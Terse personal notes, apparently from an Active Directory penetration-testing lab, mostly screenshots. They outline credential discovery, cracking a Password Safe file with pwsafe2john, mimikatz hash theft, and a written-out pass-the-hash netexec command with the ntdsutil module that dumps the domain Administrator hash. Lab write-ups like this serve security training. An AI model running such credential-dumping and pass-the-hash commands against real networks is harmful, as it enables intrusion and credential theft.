![[Screenshot 2026-05-12 at 12.56.40.png]]
![[Screenshot 2026-05-12 at 13.04.54.png]]

i checked .bash history and i saw this one, might be useful for pivot
![[Screenshot 2026-05-22 at 15.22.53.png]]

RDP successfully !!
![[Screenshot 2026-05-22 at 15.33.28.png]]

Move to smbclient 
![[Screenshot 2026-05-22 at 15.40.07.png]]
![[Screenshot 2026-05-22 at 15.42.56.png]]

`pwsafe2john Employee-Passwords_OLD.psafe3 > pass.txt`
![[Screenshot 2026-05-22 at 15.45.13.png]]

Now we get into the safe
![[Screenshot 2026-05-22 at 15.45.56.png]]

3 creds ready for DC1 ^^
![[Screenshot 2026-05-22 at 15.48.06.png]]

Logged by bdavid
![[Screenshot 2026-05-22 at 16.00.42.png]]

Using mimikatz for taking a NTLM hash from stom
![[Screenshot 2026-05-22 at 16.07.04.png]]

Checking groups in this user 'stom'
![[Screenshot 2026-05-22 at 16.19.19.png]]
![[Screenshot 2026-05-22 at 16.20.26.png]]
'Pwned'

```shell
sudo proxychains4 netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M ntdsutil
```
We got the ### NTLM hash of NEXURA\Administrator
![[Screenshot 2026-05-22 at 16.22.52.png]]
